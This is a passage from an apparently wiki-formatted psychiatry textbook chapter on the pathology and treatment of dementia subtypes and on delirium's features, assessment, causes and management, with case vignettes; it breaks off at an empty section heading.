''Multi-infarct dementia'' (MID)—the older term for VaD—usually involves infarcts in the territory of the ''middle cerebral artery'' and surrounding (&quot;watershed&quot;) regions. The middle cerebral artery is the largest cerebral artery and is the vessel most commonly affected by cerebrovascular accident. It supplies most of the outer convex brain surface, nearly all the basal ganglia, and the posterior and anterior internal capsules (Slater, 2008). In VaD, infarcts are also seen in the basal ganglia and periventricular white matter.

Subacute Arteriosclerotic Encephalopathy (SAE) and ''Lacunar state'' both involve the small vessels of the brain. SAE is caused by thickening and narrowing (arteriosclerosis) of arteries that feed subcortical areas of the brain. SAE produces widespread, microscopic areas of damage to the deep layers of ''white matter.'' (NINDS, 2008). ''Lacunar state'' (lacunar disease) is due to occlusion of small, penetrating cerebral arteries, leading to  extremely small but deep infarctions (''lacunes''). Sometimes, these lacunes are so small as to produce no obvious deficits, or only pure motor or sensory deficits (Robinson &amp; Starkstein, p. 707). Lacunar state is often associated with hypertension and/or diabetes. The cavitary lesions (lacunae) characteristic of this condition are often found in the internal capsule, deep grey matter nuclei, and white matter.

''Cerebral autosomal dominant arteriopathy with subcortical infarcts and leucoencephalopathy'' (CADASIL) is a rare, hereditary type of VaD that affects small blood vessels in the brain. An abnormality in the muscle cells surrounding these blood vessels gradually destroys the blood vessel cells. This may lead to migraines, emotional disturbance, stroke-like episodes, dementia, and other impairments (CADASIL Foundation, 2008).  CADASIL involves mutations of the Notch 3 gene on chromosome 19 (Joutel et al, 1996). There are also a growing number of genetically uncharacterized but familial small vessel diseases (Low et al, 2007).

''Dementia with Lewy Bodies (DLB)'' does exist in genetic forms, including some autosomal dominant forms (Lerner &amp; Riley, p. 919).  There is significant pathophysiological overlap between DLB and Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease (PD), on the one hand; and DLB and SDAT, on the other. Thus, ''alpha-synuclein'' is a protein that appears to modulate synaptic transmission, and constitutes the major component of ''Lewy bodies''. These structures are the pathological hallmark of both PD and DLB, whether of a sporadic or familial origin (Lerner &amp; Riley, p. 914).

There is considerable overlap between DLB and DAT. For example, ''neuritic plaques'' and ''neurofibrillary tangles'' are seen in autopsy studies of both DAT and DLB, though fewer neurofibrillary tangles are found in DLB (Samuel et al, 1997). Moreover, ''amyloid β'' (Aβ) pathology—one of the hallmarks of DAT—is often seen in DLB. Indeed, there is an interesting synergy between pathophysiological elements of DLB and DAT. For example, alpha- synuclein is a potent inducer of tau fibrillization, while Aβ  has been shown to promote Lewy body pathology in animal models (Giasson et al, 2003; Masliah et al, 2001).

''Fronto-temporal dementia - ''There appears to be a strong genetic loading in FTD. About 40% of FTD patients have a family history of a similar disorder in close relatives, and in the vast majority of cases, there is an autosomal dominant inheritance pattern. Autosomal dominant mutations in the ''tau'' gene on chromosome 17 have been discovered in FTD, and—like DAT-- FTD is generally considered a &quot;tauopathy.&quot; However, &quot;tau-negative&quot; forms of FTD have been described, including one form that often presents with concomitant ''amyotrophic lateral sclerosis ''(ALS) (Apostolova &amp; Cummings, 2008; Lantos &amp; Cairns, 2001).

Pick&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease (frontal variant FTD) produces striking frontal, temporal, or combined (fronto-temporal) atrophy. Microscopically, the hallmark are  spherical, tau-based inclusion bodies, termed ''Pick&lt;nowiki&gt;’&lt;/nowiki&gt;s bodies'', which may be seen in neurons and glial cells. Neuronal loss and swelling are also commonly seen in Pick&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease. In tau-negative forms of FTD, neuronal loss, gliosis, and microvacuolation are the sole microscopic findings.

&lt;u&gt;'''''Ethno-cultural and racial factors in dementia'''''&lt;/u&gt;

Ethnic, cultural, and racial factors play a role in the assessment of dementia and, to some extent, on its course and outcome. For example, most diagnostic tests for dementia are based on cognitive assessments not yet validated for various ethnic groups. Moreover, emigration of some ethnic groups may affect dementia prevalence, as demonstrated by higher rates of dementia among Japanese-Americans than among Japanese cohorts in Japan (Iliffe &amp; Manthorpe, 2004). Ethnic and cultural factors may also affect caregiver attitudes and behavior. For example, Latina dementia caregivers may delay institutionalization significantly longer than female Caucasian caregivers, perhaps reflecting more tolerant Latino cultural attitudes toward caregiving (Mausbach et al, 2004). Similarly, Shaw et al (1997) found lower rates of depressive symptoms in Chinese, as compared with American, caregivers of demented patients, possibly reflecting greater acceptance of traditional family roles among the Chinese subjects. Finally, ethnicity and race may play a role even in the symptomatic expression of dementia, with different ethnic and racial groups showing varying rates of aggressive behaviors, wandering, and hallucinations (Sink et al, 2004).

&lt;u&gt;'''''Treatment of Dementias'''''&lt;/u&gt;

&lt;u&gt;'''''Pharmacotherapy'''''&lt;/u&gt;

By far the most experience with pharmacotherapy has been in patients with DAT, and our discussion necessarily focuses on this condition. The mainstay of drug therapy in dementia is a group of agents called ''cholinesterase inhibitors'' (CIs), including donepezil, galantamine, and rivastigmine. (Another CI, tacrine, is rarely used nowadays in most industrialized countries, owing to its hepatotoxic effects). Comprehensive discussion of these agents may be found in Jacobson et al, 2007. All CIs act to inhibit the enzyme ''acetylcholinesterase'', which metabolizes the neurotransmitter, acetylcholine. Rivastigmine also inhibits butyrylcholinesterase, and galantamine is an allosteric modifier of the nicotinic acetylcholine receptor. There is no convincing, randomized, controlled evidence showing any one of these drugs as markedly superior to the others. Indeed, the efficacy of this group of agents appears to be modest-to-moderate, with most studies of DAT finding that the CIs mainly slow the rate of cognitive decline and/or delay nursing home placement.  One meta-analysis of 13 randomized, double blind, placebo controlled trials demonstrated that 6-12 months of treatment with donepezil, galantamine or rivastigmine in mild, moderate or severe DAT produced about a 3 point drop in scores on the 70-point ADAS-Cog Scale. Benefits were also seen on measures of activities of daily living and behavior. But as the authors note, &quot;none of these treatment effects (is) large.&quot; (Birks, 2006). The other drug used in most countries for DAT is ''memantine'', which blocks the action of glutamate at the NMDA receptor, under conditions of excessive glutamate activity (Jacobson et al, 2007). This is thought to slow neurodegeneration in DAT, and there is evidence of memantine&lt;nowiki&gt;’&lt;/nowiki&gt;s benefits in moderate-to-severe DAT. In some instances, memantine may be combined with one of the CIs, but long-term data on outcome are few.

Although atypical ''antipsychotics'' are often used—and sometimes, overused—in patients with DAT, they are not without risk in dementia-prone populations, particularly when ''vascular risk factors'' are present. In the U.S., the Food &amp; Drug Administration (FDA) issued, in June 2008, an advisory to physicians, stating the following (FDA, Alert, 6/16/08):

&lt;nowiki&gt;*&lt;/nowiki&gt;  Elderly patients with dementia-related psychosis treated with conventional or atypical antipsychotic drugs are at an increased risk of death.

* Antipsychotic drugs are not approved for the treatment of dementia-related psychosis.  Furthermore, there is no approved drug for the treatment of dementia-related psychosis.  Healthcare professionals should consider other management options.

Physicians who prescribe antipsychotics to elderly patients with dementia-related psychosis should discuss this risk of increased mortality with their patients, patients&lt;nowiki&gt;’&lt;/nowiki&gt; families, and caregivers.

Notwithstanding these serious concerns, some patients with DAT and psychotic features and/or severe behavioral disturbance (e.g., extreme agitation or aggressive violence) may require and benefit from low doses of atypical antipsychotics; e.g., risperidone 0.5 mg/day or olanzapine 5 mg/day (Alexopoulos et al, 2004).  However, attempts at behavioral modification (see below) and alternative therapies (such as the SSRI ''citalopram'') should be considered (Pollock et al, 2007). As a recent review by Ellison (2008) put it:

&quot;…several of the atypical antipsychotics remain reasonable choices when used in patients whose vascular risk factors do not outweigh their behavioral treatment needs. The atypical antipsychotics have not been proved to control agitation over an extended period of time and should be used at the lowest effective doses and for the shortest interval necessary, with sufficient psychoeducation and disclosure of risks to caregivers and relatives.&quot;

Treatment of vascular dementia (VaD) should first focus on mitigation of known risk factors, such as hypertension, diabetes, atrial fibrillation, and hyperlipidemia. Studies regarding use of CIs for vascular dementia are plagued by methodological problems, such as inclusion of those whose dementia probably involves some DAT-type pathology and cholinergic system dysfunction; nonetheless, there is modest and growing evidence that the CIs may be helpful in subgroups of patients with VaD. Similarly, Dementia with Lewy Bodies (DLB) also involves reduction of brain acetylcholine—perhaps surpassing those seen in DAT--and the CIs may sometimes be useful in DLB (Jacobson et al, 2007; ). Patients with DLB are exquisitely sensitive to the extrapyramidal side effects of antipsychotics, and both typical and atypical agents (with the possible exception of clozapine) are generally to be avoided in DLB patients.

&lt;u&gt;'''''Psychosocial and behavioral interventions'''''&lt;/u&gt;

Whenever possible, the clinician should initiate non-pharmacological interventions when managing behavioral disturbances in patients with dementia. Such behavioral approaches are aimed at ameliorating physical, environmental and psychosocial stressors that may lead to agitation, pacing, aggression, and related behavioral disturbances (Salzman et al, 2008). For example, dysfunctional verbal and physical behaviors—such as repetitive shouting, pacing, punching, etc.—may reflect unrecognized pain, loneliness, depression, boredom, or other social stressors. A variety of behavioral interventions may be helpful in this context; e.g., structured socialization, &quot;pet therapy&quot;, viewing family videotapes, and training programs for family caregivers. It is also important to review the patient&lt;nowiki&gt;’&lt;/nowiki&gt;s medical status and medications, since adverse drug effects or interactions may sometimes contribute to confusion and agitation (Jacobson et al, 2007; Salzman et al, 2008). There are relatively few well-controlled studies of non-pharmacological interventions in dementia; nevertheless, a number of promising investigational approaches are under investigation, including aroma therapy and music therapy (Raglio et al, 2008).

&lt;u&gt;'''''Special Populations'''''&lt;/u&gt;

There are several subgroups of demented patients who merit special attention and interventions. Patients with ''HIV-related dementia'' in the late stages, for example, may exhibit behavioral disinhibition, mania, and psychotic features, such as delusions and hallucinations. Primary treatment of HIV/AIDs is aimed at suppression of viral load by means of anti-retroviral therapies. Some evidence suggests that the nucleoside analog reverse transcriptase inhibitor (NRTI) ''zidovudine'' (also known as AZT) may attenuate the symptoms of HIV-related dementia and neurological impairment in some patients; however, zidovudine and related agents may themselves provoke ''neuropsychiatric complications'', such as depersonalization, mania, and delirium (Fernandez &amp; Tan, 2008). Cognitive functioning in HIV dementia patients may be improved by methylphenidate; psychotic symptoms may respond to atypical antipsychotics, such as risperidone or olanzapine. Depression in HIV/AIDS is not uncommon, but may stem from a complex mix of direct effects of HIV on the CNS, and psychosocial factors.

Antidepressants such as citalopram and escitalopram may be useful, but this patient population is particularly susceptible to drug-related side effects and interactions. Thus, any pharmacotherapy aimed at neuropsychiatric symptoms must be very carefully monitored in this population (Fernandez &amp; Tan, 2008).

As noted above, ''Dementia with Lewy Bodies'' (DLB) poses particular management problems. Psychotic symptoms, including visual hallucinations, are a central feature of DLB, and the sensitivity of these patients to antipsychotics makes treatment especially challenging. Cholinesterase inhibitors, such as rivastigmine, may ameliorate some neuropsychiatric symptoms in DLB patients, including hallucinations, paranoid delusions, apathy, aggression, and agitation (Simard &amp; van Reekum, 2004; Apostolova &amp; Cummings, 2008). If an antipsychotic must be used in DLB with psychosis, classic neuroleptics should be avoided; initiating treatment with very low doses of quetiapine or clozapine is sometimes warranted (Jacobson et al, 2007).

''Depression'' as a feature of dementia represents a diagnostic and treatment challenge. As noted earlier, depression is commonly seen in patients with Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease, Huntington&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease, DAT, and LBD, as well as in those with a history of stroke or other form of VaD. Depression may represent a prodrome to dementia or a feature of established dementia. The recently described ''amyloid-associated depression'' may represent such a prodome in DAT (Qiu et al 2008).  ''Vascular depression'' (Sneed et al, 2008, Alexopolous, 2006) may present as new-onset of depressive illness in those affected by diffuse or focal vascular lesions, and is increasingly recognized in older individuals. Conversely, the &quot;dementia of depression&quot; (formerly called ''depressive pseudodementia'') is a reversible cognitive impairment directly related to the patient&lt;nowiki&gt;’&lt;/nowiki&gt;s mood disorder. Features such as ''excessive guilt, low self-esteem, self-loathing, or persistent suicidal ideation'', as well as ''delayed responses to cognitive questions,'' are useful &quot;red flags&quot; for the presence of depression in dementia. The Cornell Scale for Depression in Dementia may be helpful in detecting this problem. Depressed patients with dementia often respond to lower doses of antidepressants (such as citalopram or sertraline) than do non-demented depressed patients (Jacobson et al, 2007).

''Delirium'' is a common complication of both HIV-related dementia and DLB, and is discussed in the section on Delirium. Co-morbid dementia and delirium is also discussed in the section on Delirium.

''Case Vignette: Mr. J. was a 78-year-old nursing home patient with dementia of the Alzheimer type (DAT). The staff were concerned and distressed by Mr. J&lt;nowiki&gt;’&lt;/nowiki&gt;s frequent &quot;moaning&quot; or &quot;yelling&quot;, particularly in the evening, and believed these behaviors were adversely affecting the other residents of the home. Mr. J. was prescribed risperidone 1.0  mg at h.s. His yelling diminished after only two days of treatment. However, he developed significant orthostatic  hypotension and akathisia, and continued to &quot;moan&quot; nearly every night. A comprehensive medical evaluation revealed that Mr. J. suffered from severe osteoarthritis, which was worsened with attempts by the &quot;night shift&quot; nurses to reposition Mr. J. in his bed. A combination of acetaminophen and local heat application led to considerable relief and marked reduction in Mr. J&lt;nowiki&gt;’&lt;/nowiki&gt;s verbal outbursts.''

''Risperidone was reduced to 0.25 mg at h.s., with significant improvement in Mr. J&lt;nowiki&gt;’&lt;/nowiki&gt;s akathisia and hypotension''.

&lt;u&gt;'''''DELIRIUM'''''&lt;/u&gt;

&lt;u&gt;'''''Phenomenology (Characteristic Features of Delirium)'''''&lt;/u&gt;

Delirium may be defined as ''an acute or subacute disturbance in cerebral functioning leading to impairment in one&lt;nowiki&gt;’&lt;/nowiki&gt;s level of consciousness, orientation, memory, and attention'', usually characterized by &quot;waxing and waning&quot; over hours or days. Common accompaniments of delirium include altered sleep-wake pattern; labile mood; speech disturbance; restlessness or agitation; perceptual abnormalities; and sometimes, psychotic features. Older terms for delirium include &quot;acute organic brain syndrome,&quot; &quot;cerebral insufficiency,&quot; and &quot;acute confusional state.&quot; Not uncommonly, delirium may be superimposed on dementia, a condition sometimes termed &quot;beclouded dementia&quot; (Sadock &amp; Sadock, 2007).

&lt;u&gt;'''''Epidemiology'''''&lt;/u&gt;

Delirium is a very common problem, particularly in emergency, medical-surgical, inpatient, and geriatric settings, such as nursing homes (Levkoff et al, 1991). Substance-abuse and oncology treatment centers also have high rates of delirium (Tasman et al, 1998). Among medical inpatients, the prevalence of delirium ranges from 11-16%, while among elderly patients admitted for acute hospital care, the prevalence ranges from 24-65%. Among elderly patients over age 65, hospitalized for a general medical condition, 10-15% will develop delirium while in the hospital. In general delirium tends to be more common among the very young and the very old, but can affect anyone at any age. Delirium is associated with longer hospital length of stay and mortality in medical surgical inpatients.

&lt;u&gt;'''''Subtypes of Delirium and Classification'''''&lt;/u&gt;

Delirium is sometimes characterized according to the predominant disturbance in motor behavior; i.e., as ''excited'' (&quot;hyperactive&quot;), ''lethargic ''(&quot;hypoactive&quot;) or ''mixed'' delirium (Trzepacz &amp; Meagher, 2008). Some evidence indicates that these motor subtypes have implications for etiology, pathophysiology, presence of non-motor symptoms, and prognosis. Thus, some evidence suggests that patients with hyperactive delirium may have a better prognosis and a lower mortality rate. Hypoactive delirium may be more likely to go undetected, as one might expect from the lack of obvious agitation. However, the definition of these subtypes varies considerably among clinicians and researchers, and their reliability has been questioned.

Another way of considering delirium is expressed by the terms &quot;excitatory&quot; and &quot;inhibitory&quot; syndromes, which we will discuss under Pathogenesis (Ferner, 2003).

Delirium with ''psychotic features''—including delusional misidentification and hallucinations—may be particularly distressing to the patient, even after resolution of the delirium (Trzepacz &amp; Meagher, 2008).

There are several ways delirium may be classified. In the ICD-10 (1993), the main categories are:

* Delirium, Not Induced By Alcohol And Other Psychoactive Substances
* Delirium, Not Superimposed On Dementia, 
* Delirium, Superimposed On Dementia

&lt;u&gt;'''''Other Delirium'''''&lt;/u&gt;

In contrast, the DSM-IV categorizes delirium according to four very broad etiologies: delirium due to ''general medical condition''; ''substance intoxication'' delirium; ''substance withdrawal'' delirium; and delirium due to ''multiple etiologies''. Delirium related to substance intoxication or withdrawal will be discussed in Chapter (   ).

The number of general medical conditions (GMCs) causing delirium is legion. Some common GMCs include ''fluid and electrolyte abnormalities, hypoglycemia, infection or sepsis, head trauma, hepatic encephalopathy, viral encephalitis, renal failure, COPD and brain tumor or hemorrhage.'' A plethora of both prescribed and over-the-counter medications can provoke delirium, including ''analgesics, antibiotics, cardiac medications, anticholinergic agents, psychotropic agents'', and a variety of ''botanicals'', such as jimsonweed. (Sadock &amp; Sadock, 2007)

''Case vignette'': ''An 84 year-old woman with a history of mild congestive heart failure, osteoarthritis, and moderate cognitive impairment thought possibly due to very early DAT appeared confused, disoriented, and hallucinating. She complained of seeing &quot;green faces&quot; and was initially diagnosed as &quot;psychotic.&quot; Physical exam and routine laboratory measures were within normal limits. Her regular medication included digoxin 0.25 mg/day (digoxin level = 0.6 ng/ml; therap=0.5-2.0). Owing to her arthritic pain, she recently had been started on ibuprofen 400 mg tid.''

''A repeat digoxin level shortly after admission showed the level to be 1.2 ng/ml (WNL). An EEG showed slowing of alpha rhythm (7-8 Hz, normal=8-12). The increase in digoxin levels was attributed to the effect of the NSAID, ibuprofen (Goldfrank, 2002). Though the absolute level of digoxin was still within the normal range, its doubling  within a short period of time evidently set off the patient&lt;nowiki&gt;’&lt;/nowiki&gt;s confusion. Abnormal color perception—particularly in the green or yellow end of the spectrum (xanthopsia)—is a classic sign of digoxin toxicity (Piltz et al, 1993).''

&lt;u&gt;'''''Assessment and Diagnostic Testing'''''&lt;/u&gt;

Delirium remains a clinical diagnosis'', ''with a careful ''history, physical exam, mental status exam, and review of medication and laboratory findings ''as the most useful diagnostic &quot;instruments&quot; (Sadock &amp; Sadock, 2007).  Typically, the onset of delirium is acute (over a period of hours, days, or in some cases weeks) and there is a marked change from the patient&lt;nowiki&gt;’&lt;/nowiki&gt;s &quot;baseline&quot; cognitive state. A recent change in medication; recent substance abuse/discontinuation; or some recent medical or neurological event (fall, infection, stroke, etc.) may provide the critical historical clues. The classic findings on mental status include a fluctuating level of consciousness (e.g., the patient &quot;nods off&quot; or drifts in and out of awareness); inability to pay attention to the examiner; disorientation to date and place (though intact orientation does ''not'' rule out delirium); impaired recent memory (e.g., inability to recall 3 of 3 items after 5 minutes); and associated features, such as disorganized thought processes (tangentiality, loose associations), perceptual abnormalities (auditory, and particularly, prominent ''visual'' or ''tactile'', hallucinations); and psychomotor abnormalities (agitation, slowing). Affect may be quite labile, and delusions may also be present.

When delirium is superimposed upon dementia, it appears that delirium phenomenology generally overshadows that of the dementia. Thus, delirium tends to present similarly regardless of whether it is accompanied by dementia. The clinical maxim should be, &quot;altered mental status reflects delirium until proven otherwise,&quot; in order to prevent misattribution of delirium to the more chronic brain syndrome of dementia (Trzepacz &amp; Meagher, 2008, p. 451). History from family members or caregivers may provide critical information suggesting a more acute change in functioning.

''Physical examination'' may be difficult in an agitated, delirious patient, but every effort must be made to rule out head trauma, acute neurological events, and severe autonomic dysfunction (such as marked hypotension). Pulse, blood pressure, temperature, respirations should all be checked. An examination of the head and neck—including papillary function and extraocular movements—should be carried out. A basic assessment of heart, lungs, and neurological function should be obtained. Specific physical findings may provide a clue as to the etiology of the delirium. For example, a patient with ''papilledema and hypertension'' may be experiencing hypertensive encephalopathy; ''nuchal rigidity'' may point to meningitis or subarachnoid hemorrhage (Sadock &amp; Sadock). One helpful clue may be ''pupillary findings'': in cases of anticholinergic toxicity, pupils may be dilated but sluggish; in cases of &quot;hyper-adrenergic&quot; delirium (e.g., in sedative withdrawal, amphetamine/cocaine intoxication, or hyperthyroid storm), pupils may be dilated by briskly ''reactive'' (Ferner, 2003).

Adjunctive ''screening instruments'' for detecting delirium include the CAM (Confusion Assessment Method); the CTD (Cognitive Test for Delirium); and the DRS-R98 (Delirium Rating Scale, Revised 98). The CAM is probably the most widely used delirium screening test in general hospital settings, and is based on DSM-III criteria (Trzepacz &amp; Meagher, 2008). Recently, Fanjiang &amp; Folstein (2001) developed a simple screening scale for use by medical students, called the ''Three Item Delirium Scale''. This requires the presence of ''altered consciousness'' plus either ''cognitive impairment'' or ''hallucinations''; preliminary data suggest good sensitivity and specificity for delirium (Trzepacz &amp; Meagher, 2008).

''Laboratory measures and ancillary testing: ''There is no pathognomonic &quot;test&quot; for the diagnosis of delirium. However, it is important to obtain routine laboratory studies on all delirious patients, including—most urgently--complete blood count, electrolytes

( including calcium, magnesium, and phosphate), renal and hepatic functions (including ammonia), serum glucose and erythrocyte sedimentation rate. Thyroid functions should also be checked. A blood and/or urine screen for drugs of abuse is helpful, and serologic tests for syphilis (such as VDRL) and HIV infection may also be indicated. An electrocardiogram (EKG) and chest radiograph are usually appropriate, in order to rule out cardiac arrhythmia, silent ischemia, or occult pneumonia among other causes. A bedside test for oxygenation is also useful. An electroencephalogram (EEG) is often advised as a standard study in the work up of delirium (Sadock &amp; Sadock, 2007), since the EEG often reveals either generalized slowing or focal areas of hyperactivity. (Serial EEGs may also be helpful in following the &quot;progress&quot; of treatment, in that one may see restoration of normal (8-12 Hz) alpha rhythm as the delirium resolves). Depending upon history and specific medical presentations, ancillary tests, such as lumbar puncture, blood cultures, B12 level, and structural brain imaging (CT, MRI) may be clearly indicated. It is important to note that correction of underlying metabolic, electrolyte, or other abnormalities does not necessarily lead to immediate resolution of the delirium; typically, there is a &quot;lag&quot; between such corrections and the patient&lt;nowiki&gt;’&lt;/nowiki&gt;s level of consciousness. This is particularly true in those circumstances where CNS drug levels (e.g. lithium) may normalize more slowly than blood levels; or when correction of blood abnormalities

(such as high glucose or sodium) needs to occur slowly, in order to prevent CNS complications.  One should treat the ''patient'', not the &quot;lab slip&quot;!

&lt;u&gt;'''''Pathogenesis of Delirium'''''&lt;/u&gt;

Even though delirium may arise from a multitude of underlying causes, several unifying hypotheses have been advanced to explain the general mechanisms of most delirious states (Ferner, 2003). One such hypothesis emphasizes the balance between ''excitatory and inhibitory neurotransmission'' in the brain, and derives a broad separation of brain syndromes on this basis. For example, ''excitatory delirium syndromes'' may involve excessive augmentation of excitatory neurotransmitters, such as glutamate, dopamine and norepinephrine (serotonin may also be considered excitatory to some degree). Antagonism of certain cholinergic receptors, on this view, also constitutes an &quot;excitatory&quot; effect. Thus, delirium syndromes as diverse as amphetamine toxicity and poisoning with the anticholinergic agent benztropine would be predicted to have similar excitatory effects, including ''agitation, tachycardia, hypertension ''and ''fever.'' (Anticholinergic syndromes may present with the classic and memorable findings of &quot;hot as a hare, mad as a hatter, red as a beet, dry as a bone&quot;; i.e., ''fever, agitated confusion or psychosis; red skin; ''and'' dry mouth'').

''Inhibitory delirium syndromes'', in Ferner&lt;nowiki&gt;’&lt;/nowiki&gt;s view (Ferner, 2003), involve agents that augment the inhibitory neurotransmitter, GABA, or act as agonists at the mu opioid receptor. Thus, in large quantities, GABA agonists such as benzodiazepines (and to some degree, ethanol) or opioids such as morphine may cause delirious states characterized by ''drowsiness, ataxia, respiratory suppression, ''and'' slurred speech.'' Pathological alterations in GABA activity--perhaps amplified by an endogenous toxin that binds to benzodiazepine receptors--have also been implicated in hepatic encephalopathy (Rummans et al, 1995). In some cases of inhibitory syndromes, &quot;paradoxical&quot; agitation may result from disinhibition of higher brain centers that normally suppress aggression or agitation (Ferner, 2003).

Another unifying hypothesis focuses specifically on ''low'' ''cholinergic ''and ''high dopaminergic transmission ''in delirium (Trzepacz &amp; Meagher, 2008),

as well as derangements in ''non-dominant, posterior parietal ''and'' prefrontal cortices.'' Other brain regions, including the brain stem, basal ganglia and thalamus, are likely to be involved. Importantly for the cholinergic hypothesis, a variety of disease states causing delirium are associated with cholinergic deficiency; e.g., thiamine deficiency, hypoxia, and hypoglycemia all ''reduce acetylcholine'' by affecting the oxidative metabolism of glucose and production of acetyl coenzyme-A (Trzepacz &amp; Meagher, 2008).

The pathogenesis of delirium must also consider predisposing medical risk factors, though, as Trzepacz and Meagher note, these must not be confused with ''causes'' of delirium. Predisposing factors include but are by no means limited to: ''genetic risk factors'' (such as APOE4 genotype); ''old age''; ''pre-existing cognitive impairment; use of multiple medications'' (especially anticholinergic agents and opioids); ''pre-existing cerebrovascular accident/stroke''; and ''vitamin'' (especially thiamine) ''deficiency'' (Trzepacz &amp; Meagher, 2008).

To some degree, psychological factors, as well as quality of hospital care, may also influence certain aspects of delirium. As Mohta et al (2003) have pointed out, the experience of being in the intensive care or trauma unit may activate various psychological defense mechanisms, such as denial, regression, anger, anxiety and depression. Delirium itself may, in some cases, represent a regressive defense, though  such psychodynamic hypotheses must never vitiate the clinician&lt;nowiki&gt;’&lt;/nowiki&gt;s search for specific physiological precipitants.

The likelihood of delirium may also be influenced by the kind of care the patient receives. For example, Inouye and coworkers (1999) evaluated 852 hospitalized older patients who were nonrandomly assigned to usual care or management with a multi-pronged intervention designed to minimize risk factors for delirium. These protocols included repeated reorientation of the patient; provision of cognitively stimulating activities; a nonpharmacologic sleep protocol; early mobilization activities and range of motion exercises; timely removal of catheters and physical restraints; use of eyeglasses and hearing aids; and early correction of dehydration. These interventions significantly reduced the incidence of delirium (15.0% in the usual care group versus 9.9% in the intervention group).

&lt;u&gt;'''''Treatment and Management of Delirium'''''&lt;/u&gt;

The primary treatment of delirium entails diagnosing and correcting the ''underlying cause'' of the brain dysfunction. Thus, if an electrolyte disturbance appears to be the causal factor, one corrects it; if an infection seems to be &quot;driving&quot; the delirium, one treats it with appropriate anti-microbials (which may also provoke confusional states). If the patient&lt;nowiki&gt;’&lt;/nowiki&gt;s delirium appears due to a newly-prescribed medication, that agent is held or discontinued immediately, if clinically safe and feasible. (If one must avoid a superimposed withdrawal syndrome, the offending agent is tapered off and discontinued as rapidly as possible).

There are some &quot;cause-specific&quot; agents that treat a few narrowly-defined types of delirium. For example, in cases of known or suspected anticholinergic-induced delirium, the cholinesterase inhibitor, ''physostigmine'', is indicated (and in the U.S., has FDA-approved labeling for this use). However, physostigmine is not without its own side effects, such as bradycardia. In cases of known or suspected alcohol withdrawal-related delirium (delirium tremens, &quot;DTs&quot;), a ''benzodiazepine'' is the treatment of choice (see Chapter ….). For benzodiazepine-induced delirium, limited data suggest that the benzodiazepine antagonist, ''flumazenil'', may be useful (Olshaker &amp; Flanigan, 2003).

In many cases of delirium, a specific cause is not identified, or multiple causes are suspected. If, after a thorough medical evaluation, no specific etiology is found, one is left to &quot;manage&quot; the neurobehavioral complications of delirium as effectively and safely as possible—and without making matters worse. Unfortunately, many psychotropic agents used to manage the behavioral complications of delirium (such as agitation or disinhibted behavior) may themselves cause confusion or exacerbation of the delirium. Thus, treatment should be as conservative as possible, avoiding high doses, or agents whose mechanisms of action overlap with those of drugs implicated in causing the delirium. For example, the hallucinogen, phencyclidine (&quot;PCP&quot;, &quot;Angel Dust&quot;) has complex effects on acetylcholine (Helman &amp; Habal, 2006) that may be exacerbated if one treats PCP-induced psychosis with a highly anticholinergic phenothiazine.

For management of neurobehavioral complications of delirium (marked agitation, aggression, tearing out IV lines, etc.), the agents of choice remain the higher-potency neuroleptics, particularly haloperidol (5-40 mg/day, in divided doses) (Inouye, 2006a). Although larger doses have been used intravenously, particularly in ICU or SICU settings, these agents have risk of producing torsades des pointe arrythmias, which have been associated with lethal ventricular arrythmias, particularly in patients with hypovolemia, hypomagnesemia or other electrolyte abnormalities. (Hassaballa &amp; Balk, 2003).

There is, however, increasing interest in use of newer &quot;atypical&quot; antipsychotics in this setting, and some limited data suggest they may be safe and effective (Han &amp; Kim, 2004). Although benzodiazepines, such as lorazepam, are often administered to delirious patients, this group of agents carries significant risks in this population; e.g., paradoxical &quot;disinhibition,&quot; worsening, or prolongation of the patient&lt;nowiki&gt;’&lt;/nowiki&gt;s confusion (Inouye, 2006 a,b). With the exception of delirium tremens, there are few instances of delirium in which benzodiazpines would be indicated.

There is also considerable interest in—but only preliminary evidence for—the use of ''cholinesterase inhibitors'' such as ''donepezil'' (see above, re: DAT) in delirium. Preliminary evidence has been mixed, and clinical observation suggests that any beneficial effects on confusion and memory impairment are modest and slowly-achieved (Jacobson et al, 2007). One recent controlled study (Liptzin et al, 2005) was &quot;…unable to demonstrate a benefit for donepezil in preventing or treating delirium in a relatively young and cognitively-intact group of elderly patients undergoing elective orthopedic surgery.&quot;

''Non''-pharmacologic approaches to the delirious patient are an important part of good care, and include provision of &quot;orienting cues&quot;, such as clocks and calendars; continuity of nursing care; placement of familiar objects (such as a family picture) near the patient; and therapeutic use of friends and family to create a familiar and calming environment (Rummans et al, 1995). Finally, primary prevention of delirium involves a comprehensive strategy, including: 1) recognizing and mitigating known risk factors such as dehydration, sleep deprivation, hearing impairment, etc. (Inouye et al, 1999); 2) proactive geriatric consultation, prior to planned surgery; and 3) education of staff charged with the care of high-risk patients (Trzepacz &amp; Meagher, 2008).

&lt;u&gt;'''''Psychiatric Symptoms Secondary to General Medical Conditions'''''&lt;/u&gt;

There is a complex and multidimensional relationship between psychiatric and medical illnesses. Psychiatric illness can be exacerbated by the presence of co-morbid medical illness and its management can be made more complex by pharmacologic or other management needs of medical illness. Psychiatric illness can present in general medical settings with medical symptoms secondary to psychiatric illness. Finally psychiatric disorders can be directly caused by the presence of known or occult medical/neurological illness.  In this section, we will focus on this last category.

In the DSM-IV, this heterogeneous group of diagnoses comprises six main categories: ''psychotic disorders, mood disorders, anxiety disorders, catatonic disorders, personality alterations, ''and'' amnestic disorders''. In the ICD-10, the term &quot;organic&quot; is applied to the first five categories; e.g., ''organic hallucinosis ''and'' organic delusional disorder; organic mood &lt;nowiki&gt;[&lt;/nowiki&gt;affective&lt;nowiki&gt;]&lt;/nowiki&gt; disorder; organic anxiety disorder; organic catatonic disorder; ''and'' organic personality disorder''. We have already alluded to what we view as philosophical problems with the term &quot;organic&quot;. For this reason, we will use the neutral designation, ''psychiatric symptoms secondary to general medical conditions'' (Psy-GMCs) as a &quot;bridging&quot; term to encompass both the DSM and ICD categories.

&lt;u&gt;'''''Prevalence in selected settings'''''&lt;/u&gt;

